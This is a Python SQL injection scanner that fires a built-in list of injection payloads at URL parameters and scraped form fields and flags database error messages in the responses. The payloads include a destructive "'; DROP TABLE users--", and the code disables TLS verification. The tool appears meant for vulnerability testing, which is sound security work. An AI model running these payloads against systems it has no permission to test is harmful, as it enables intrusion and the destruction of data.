import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import time

class SQLInjectionScanner:
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' UNION SELECT 1,2,3--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' OR (SELECT COUNT(*) FROM users) > 0--"
        ]
        
        self.error_patterns = [
            "mysql_fetch_array",
            "mysql_num_rows",
            "ORA-",
            "Microsoft OLE DB Provider",
            "ODBC Driver",
            "PostgreSQL",
            "SQLServer JDBC Driver",
            "SQL syntax",
            "MySQL server version",
            "Warning: mysql",
            "Unclosed quotation mark",
            "You have an error in your SQL syntax"
        ]

    def scan(self, target_url):
        vulnerabilities = []
        
        try:
            # Test URL parameters
            vulnerabilities.extend(self.test_url_parameters(target_url))
            
            # Test form parameters
            vulnerabilities.extend(self.test_forms(target_url))
            
        except Exception as e:
            vulnerabilities.append({
                'name': 'Scan Error',
                'description': f'Error during SQL injection scan: {str(e)}',
                'severity': 'Info',
                'location': target_url,
                'payload': '',
                'recommendation': 'Check target URL accessibility'
            })
        
        return vulnerabilities

    def test_url_parameters(self, url):
        vulnerabilities = []
        parsed_url = urlparse(url)
        query_params = {}
        
        if parsed_url.query:
            from urllib.parse import parse_qs
            query_params = parse_qs(parsed_url.query)
        
        # If no parameters, add a test parameter
        if not query_params:
            test_params = {'id': '1', 'page': 'home', 'category': 'test'}
        else:
            test_params = {key: value[0] for key, value in query_params.items()}
        
        for param_name, original_value in test_params.items():
            for payload in self.payloads:
                try:
                    # Create test URL with payload
                    test_params_copy = test_params.copy()
                    test_params_copy[param_name] = payload
                    
                    # Reconstruct URL with payload
                    query_string = '&'.join([f"{k}={v}" for k, v in test_params_copy.items()])
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                    
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    if self.detect_sql_errors(response.text):
                        vulnerabilities.append({
                            'name': 'SQL Injection',
                            'description': f'SQL injection vulnerability detected in parameter: {param_name}',
                            'severity': 'High',
                            'location': test_url,
                            'payload': payload,
                            'recommendation': 'Use parameterized queries and input validation'
                        })
                        break  # Stop testing this parameter if vulnerability found
                        
                except requests.RequestException:
                    continue
        
        return vulnerabilities

    def test_forms(self, url):
        vulnerabilities = []
        
        try:
            response = requests.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action')
                form_method = form.get('method', 'get').lower()
                form_url = urljoin(url, form_action) if form_action else url
                
                # Find all input fields
                inputs = form.find_all('input')
                form_data = {}
                
                for input_field in inputs:
                    input_name = input_field.get('name')
                    input_type = input_field.get('type', 'text')
                    
                    if input_name and input_type not in ['submit', 'button']:
                        form_data[input_name] = 'test'
                
                # Test each input field with SQL payloads
                for field_name in form_data.keys():
                    for payload in self.payloads:
                        try:
                            test_data = form_data.copy()
                            test_data[field_name] = payload
                            
                            if form_method == 'post':
                                response = requests.post(form_url, data=test_data, timeout=10, verify=False)
                            else:
                                response = requests.get(form_url, params=test_data, timeout=10, verify=False)
                            
                            if self.detect_sql_errors(response.text):
                                vulnerabilities.append({
                                    'name': 'SQL Injection',
                                    'description': f'SQL injection vulnerability detected in form field: {field_name}',
                                    'severity': 'High',
                                    'location': form_url,
                                    'payload': payload,
                                    'recommendation': 'Use parameterized queries and input validation'
                                })
                                break  # Stop testing this field if vulnerability found
                                
                        except requests.RequestException:
                            continue
                            
        except Exception as e:
            # Silently continue if form parsing fails
            pass
        
        return vulnerabilities

    def detect_sql_errors(self, response_text):
        response_lower = response_text.lower()
        for pattern in self.error_patterns:
            if pattern.lower() in response_lower:
                return True
        return False